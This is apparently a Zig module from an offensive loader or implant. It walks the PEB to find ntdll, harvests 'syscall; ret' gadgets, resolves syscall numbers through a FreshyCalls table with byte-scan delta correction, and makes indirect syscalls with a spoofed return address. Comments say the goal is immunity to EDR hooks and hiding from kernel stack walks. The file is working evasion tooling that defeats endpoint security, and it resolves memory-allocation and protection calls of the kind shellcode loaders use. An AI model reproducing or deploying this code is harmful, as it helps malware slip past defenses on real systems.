// peb walk, gadget pool scan, FreshyCalls SSN table.
const std = @import("std");
const windows = std.os.windows;
const nt = @import("nt.zig");
const pe = @import("pe.zig");

pub const Entry = struct {
    number: u32,
    gadget: *anyopaque,
};

// all resolved syscalls. resolve() peb-walks ntdll, builds freshy table,
// scans for gadgets, cracks each syscall.
pub const Syscalls = struct {
    NtAllocateVirtualMemory: Entry,
    NtProtectVirtualMemory: Entry,
    NtDelayExecution: Entry,

    pub fn resolve() ?Syscalls {
        const ntdll = findNtdll() orelse return null;
        seed_prng();
        scan_gadget_pool(ntdll) orelse return null;
        build_freshy_table(ntdll);
        extract_pdata(ntdll);

        const names = [_][]const u8{
            "NtDelayExecution",
            "NtAllocateVirtualMemory",
            "NtProtectVirtualMemory",
        };
        var result = Syscalls{
            .NtAllocateVirtualMemory = undefined,
            .NtProtectVirtualMemory = undefined,
            .NtDelayExecution = undefined,
        };
        // recycledGate: FreshyCalls (hook-immune) + byte-scan validation + delta correction.
        // if any function isn't hooked, byte-scan it, compute the delta vs FreshyCalls,
        // and apply to all. delta measured uniform +4 on Win11 24H2/25H2.
        var delta: i16 = 0;
        var delta_done = false;
        inline for (names) |name| {
            const fssn = extract_ssn(hash_ror13(name)) orelse return null;
            const byte_ssn = read_ssn_from_stub(@ptrCast(ntdll), name);
            if (byte_ssn) |b| {
                if (!delta_done) {
                    delta = @as(i16, @intCast(b)) - @as(i16, @intCast(fssn));
                    delta_done = true;
                }
                @field(result, name) = Entry{ .number = b, .gadget = @ptrFromInt(g_syscall_addrs[0]) };
            } else {
                @field(result, name) = Entry{ .number = @intCast(@as(i16, @intCast(fssn)) + delta), .gadget = @ptrFromInt(g_syscall_addrs[0]) };
            }
        }
        return result;
    }
};

// ---- state ----

pub const RUNTIME_FUNCTION = extern struct {
    BeginAddress: u32,
    EndAddress: u32,
    UnwindInfoAddress: u32,
};

var g_exc_begin: usize = 0;
var g_exc_count: usize = 0;

var g_syscall_addrs: [64]usize = [_]usize{0} ** 64; 
var g_syscall_count: usize = 0; 
var g_ntdll_base: ?*anyopaque = null; 
var g_ntdll_size: usize = 0; 
var g_fake_return_addr: usize = 0; 
var g_rand_state: u64 = 0;

// FreshyCalls table: ntdll Nt* exports sorted by RVA. SSN = sort position.
const FRESHY_MAX: usize = 1024;
const FreshyEntry = struct { hash: u32, rva: u32 };
var g_freshy_entries: [FRESHY_MAX]FreshyEntry = undefined;
var g_freshy_count: usize = 0;
var g_freshy_ready: bool = false;

// ---- ror13 hash (case-insensitive, used by FreshyCalls + fallback) ----
fn hash_ror13(input: []const u8) u32 {
    var hash: u32 = 0;
    for (input) |c| {
        var c_upper = c;
        if (c_upper >= 'a' and c_upper <= 'z') c_upper -= 32;
        hash = (hash >> 13) | (hash << 19);
        hash +%= c_upper;
    }
    return hash;
}

// ---- prng ----

fn xorshift64() u64 {
    var s = g_rand_state;
    s ^= s << 13;
    s ^= s >> 7;
    s ^= s << 17;
    g_rand_state = s;
    return s;
}

fn seed_prng() void {
    var stack_var: u64 = 0;
    g_rand_state = @as(u64, @truncate(@intFromPtr(&stack_var)));
}

// ---- peb walk ----

const PEB = extern struct {
    reserved1: [2]u8,
    being_debugged: u8,
    reserved2: u8,
    reserved3: [2]*anyopaque,
    ldr: *PEB_LDR_DATA,
};

const PEB_LDR_DATA = extern struct {
    length: u32,
    initialized: u8,
    reserved: [3]u8,
    ss_handle: *anyopaque,
    in_load_order_module_list: LIST_ENTRY,
    in_memory_order_module_list: LIST_ENTRY,
    in_initialization_order_module_list: LIST_ENTRY,
};

const LIST_ENTRY = extern struct {
    flink: *LIST_ENTRY,
    blink: *LIST_ENTRY,
};

const LDR_DATA_TABLE_ENTRY = extern struct {
    in_load_order_links: LIST_ENTRY,
    in_memory_order_links: LIST_ENTRY,
    in_initialization_order_links: LIST_ENTRY,
    dll_base: *anyopaque,
    entry_point: *anyopaque,
    size_of_image: u32,
    full_dll_name: extern struct { length: u16, maximum_length: u16, buffer: [*]u16 },
    base_dll_name: extern struct { length: u16, maximum_length: u16, buffer: [*]u16 },
};

fn findNtdll() ?[*]u8 {
    const peb_addr: usize = asm volatile ("mov %%gs:0x60, %[r]"
        : [r] "=r" (-> usize),
    );
    const peb_ptr = @as(*const PEB, @ptrFromInt(peb_addr));
    const head = &peb_ptr.ldr.in_memory_order_module_list;

    var entry = head.flink;
    while (entry != head) : (entry = entry.flink) {
        const mod: *LDR_DATA_TABLE_ENTRY = @fieldParentPtr("in_memory_order_links", entry);
        if (@intFromPtr(mod.dll_base) == 0) continue;

        const dos = @as(*align(1) const pe.IMAGE_DOS_HEADER, @ptrFromInt(@intFromPtr(mod.dll_base)));
        if (dos.e_magic != 0x5A4D) continue;

        const nt_hdrs = @as(*align(1) const pe.IMAGE_NT_HEADERS, @ptrFromInt(
            @intFromPtr(mod.dll_base) + @as(usize, @intCast(dos.e_lfanew)),
        ));
        if (nt_hdrs.Signature != 0x00004550) continue;

        const exp_dir = nt_hdrs.OptionalHeader.DataDirectory[0];
        if (exp_dir.VirtualAddress == 0) continue;

        const exp = @as(*align(1) const pe.IMAGE_EXPORT_DIRECTORY, @ptrFromInt(
            @intFromPtr(mod.dll_base) + @as(usize, @intCast(exp_dir.VirtualAddress)),
        ));
        const name_ptr = @as([*:0]const u8, @ptrFromInt(
            @intFromPtr(mod.dll_base) + @as(usize, @intCast(exp.Name)),
        ));
        if (std.mem.eql(u8, std.mem.sliceTo(name_ptr, 0), "ntdll.dll")) {
            g_ntdll_base = @ptrFromInt(@intFromPtr(mod.dll_base));
            g_ntdll_size = mod.size_of_image;
            return @ptrFromInt(@intFromPtr(mod.dll_base));
        }
    }
    return null;
}

// ---- gadget pool ----

fn scan_gadget_pool(ntdll_base: ?*anyopaque) ?void {
    const base = ntdll_base orelse return null;
    const base_bytes: [*]const u8 = @ptrCast(base);
    const dos = @as(*align(1) const pe.IMAGE_DOS_HEADER, @ptrCast(@alignCast(base_bytes)));
    if (dos.e_magic != 0x5A4D) return null;

    const nt_hdrs = @as(*align(1) const pe.IMAGE_NT_HEADERS, @ptrCast(@alignCast(
        base_bytes + @as(usize, @intCast(dos.e_lfanew)),
    )));
    if (nt_hdrs.Signature != 0x00004550) return null;

    const section_off = @as(usize, @intCast(dos.e_lfanew)) + @sizeOf(pe.IMAGE_NT_HEADERS64);
    const sections = @as([*]align(1) const pe.IMAGE_SECTION_HEADER, @ptrCast(@alignCast(
        @as([*]u8, @ptrCast(@constCast(base_bytes))) + section_off,
    )));

    var text_va: usize = 0;
    var text_size: usize = 0;
    for (0..nt_hdrs.FileHeader.NumberOfSections) |si| {
        const sec = &sections[si];
        if (std.mem.eql(u8, sec.Name[0..5], ".text") and sec.Name[5] == 0) {
            text_va = sec.VirtualAddress;
            text_size = sec.VirtualSize;
            break;
        }
    }
    if (text_va == 0 or text_size == 0) return null;

    g_syscall_count = 0;
    var j: usize = text_va;
    const scan_end: usize = text_va + text_size;
    while (j < scan_end - 3 and g_syscall_count < g_syscall_addrs.len) : (j += 1) {
        // syscall; ret = 0F 05 C3
        if (base_bytes[j] == 0x0F and base_bytes[j + 1] == 0x05 and base_bytes[j + 2] == 0xC3) {
            g_syscall_addrs[g_syscall_count] = @intFromPtr(&base_bytes[j]);
            g_syscall_count += 1;
        }
        // standalone ret for callstack spoofing (not part of syscall;ret)
        if (g_fake_return_addr == 0 and base_bytes[j] == 0xC3) {
            if (j < 2 or base_bytes[j - 2] != 0x0F or base_bytes[j - 1] != 0x05) {
                g_fake_return_addr = @intFromPtr(&base_bytes[j]);
            }
        }
    }
    if (g_syscall_count == 0) return null;
}

// ---- freshycalls ----

fn build_freshy_table(ntdll_base: ?*anyopaque) void {
    const base = ntdll_base orelse return;
    const base_bytes: [*]u8 = @ptrCast(base);
    const dos = @as(*align(1) const pe.IMAGE_DOS_HEADER, @ptrCast(@alignCast(base_bytes)));
    if (dos.e_magic != 0x5A4D) return;

    const nt_hdrs = @as(*align(1) const pe.IMAGE_NT_HEADERS, @ptrCast(@alignCast(
        base_bytes + @as(usize, @intCast(dos.e_lfanew)),
    )));
    if (nt_hdrs.Signature != 0x00004550) return;

    const export_dir = nt_hdrs.OptionalHeader.DataDirectory[0];
    if (export_dir.VirtualAddress == 0 or export_dir.Size == 0) return;

    const exp = @as(*align(1) const pe.IMAGE_EXPORT_DIRECTORY, @ptrCast(@alignCast(
        base_bytes + @as(usize, @intCast(export_dir.VirtualAddress)),
    )));
    if (exp.NumberOfNames == 0) return;

    const names = @as([*]align(1) const u32, @ptrCast(@alignCast(
        base_bytes + @as(usize, @intCast(exp.AddressOfNames)),
    )));
    const funcs = @as([*]align(1) const u32, @ptrCast(@alignCast(
        base_bytes + @as(usize, @intCast(exp.AddressOfFunctions)),
    )));
    const ords = @as([*]align(1) const u16, @ptrCast(@alignCast(
        base_bytes + @as(usize, @intCast(exp.AddressOfNameOrdinals)),
    )));

    g_freshy_count = 0;
    const export_dir_end = export_dir.VirtualAddress + export_dir.Size;
    var i: u32 = 0;
    while (i < exp.NumberOfNames and g_freshy_count < FRESHY_MAX) : (i += 1) {
        const name_ptr = @as([*:0]const u8, @ptrCast(@alignCast(
            base_bytes + @as(usize, @intCast(names[i])),
        )));
        const name = std.mem.sliceTo(name_ptr, 0);
        if (name.len < 2 or name[0] != 'N' or name[1] != 't') continue;

        const ordinal = ords[i];
        if (ordinal >= exp.NumberOfFunctions) continue;
        const rva = funcs[ordinal];
        if (rva >= export_dir.VirtualAddress and rva < export_dir_end) continue;

        g_freshy_entries[g_freshy_count] = FreshyEntry{ .hash = hash_ror13(name), .rva = rva };
        g_freshy_count += 1;
    }

    std.mem.sort(FreshyEntry, g_freshy_entries[0..g_freshy_count], {}, struct {
        fn lt(_: void, a: FreshyEntry, b: FreshyEntry) bool {
            return a.rva < b.rva;
        }
    }.lt);
    g_freshy_ready = true;
}

// Extract SSN from FreshyCalls table. Immune to inline hooks —
// EDRs can't change the linker's RVA order in the PE export table.
// RVA sort order != KiServiceTable order on some builds. verified against byte-scanning.
fn extract_ssn(func_hash: u32) ?u16 {
    if (!g_freshy_ready) return null;
    for (0..g_freshy_count) |i| {
        if (g_freshy_entries[i].hash == func_hash) return @as(u16, @intCast(i));
    }
    return null;
}

// read the actual SSN from the syscall stub by scanning its .pdata range.
// works across hooks by using the function's RUNTIME_FUNCTION boundaries.
fn read_ssn_from_stub(ntdll_bytes: [*]const u8, name: []const u8) ?u16 {
    const addr = pe.findExport(@constCast(ntdll_bytes), name) orelse return null;
    if (g_exc_begin == 0 or g_exc_count == 0) return null;
    const func_rva: u32 = @truncate(@intFromPtr(addr) - @intFromPtr(ntdll_bytes));
    const funcs: [*]align(1) const RUNTIME_FUNCTION = @ptrFromInt(g_exc_begin);
    var lo: usize = 0;
    var hi: usize = g_exc_count;
    while (lo < hi) {
        const mid = lo + (hi - lo) / 2;
        const entry = funcs[mid];
        if (func_rva < entry.BeginAddress) {
            hi = mid;
        } else if (func_rva >= entry.EndAddress) {
            lo = mid + 1;
        } else {
            const start: u32 = entry.BeginAddress;
            const end: u32 = entry.EndAddress;
            const scan: [*]const u8 = @ptrCast(ntdll_bytes + start);
            const scan_len = @min(end - start, 96);
            var j: usize = 0;
            while (j + 4 < scan_len) : (j += 1) {
                if (scan[j] == 0xB8) {
                    const arr: *const [4]u8 = @ptrCast(scan[j + 1 ..][0..4]);
                    const ssn = std.mem.readInt(u32, arr, .little);
                    if ((ssn & 0xFFFF0000) == 0 and ssn > 0 and ssn < 0x1000) {
                        return @truncate(ssn);
                    }
                }
            }
            return null;
        }
    }
    return null;
}

// extract ntdll .pdata (exception directory) for binary search by RVA.
fn extract_pdata(ntdll: ?*anyopaque) void {
    const base = ntdll orelse return;
    const bytes: [*]const u8 = @ptrCast(base);
    const dos = @as(*align(1) const pe.IMAGE_DOS_HEADER, @ptrCast(@alignCast(bytes)));
    if (dos.e_magic != 0x5A4D) return;
    const nt_hdrs = @as(*align(1) const pe.IMAGE_NT_HEADERS, @ptrCast(@alignCast(bytes + @as(usize, @intCast(dos.e_lfanew)))));
    if (nt_hdrs.Signature != 0x00004550) return;
    const exc = nt_hdrs.OptionalHeader.DataDirectory[3];
    if (exc.VirtualAddress == 0 or exc.Size == 0) return;
    g_exc_begin = @intFromPtr(bytes) + exc.VirtualAddress;
    g_exc_count = exc.Size / @sizeOf(RUNTIME_FUNCTION);
}

// ---- indirect syscall dispatch ----

extern fn hells_gate(ssn: u32, syscall_addr: usize, fake_return: usize) void;
extern fn hell_descent(
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) usize;

// pick a random gadget from the pool, push a fake ret from ntdll so the
// kernel stack walk shows ntdll frames, then dispatch.
pub fn syscall_dispatch(ssn: u32, args: [*]const usize, arg_count: usize) usize {
    const idx = @as(usize, @truncate(xorshift64())) % g_syscall_count;
    const gadget = g_syscall_addrs[idx];
    const fake: usize = if (arg_count < 5) g_fake_return_addr else 0;
    hells_gate(ssn, gadget, fake);
    const a = [11]usize{
        if (arg_count > 0) args[0] else 0,
        if (arg_count > 1) args[1] else 0,
        if (arg_count > 2) args[2] else 0,
        if (arg_count > 3) args[3] else 0,
        if (arg_count > 4) args[4] else 0,
        if (arg_count > 5) args[5] else 0,
        if (arg_count > 6) args[6] else 0,
        if (arg_count > 7) args[7] else 0,
        if (arg_count > 8) args[8] else 0,
        if (arg_count > 9) args[9] else 0,
        if (arg_count > 10) args[10] else 0,
    };
    return hell_descent(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9], a[10]);
}
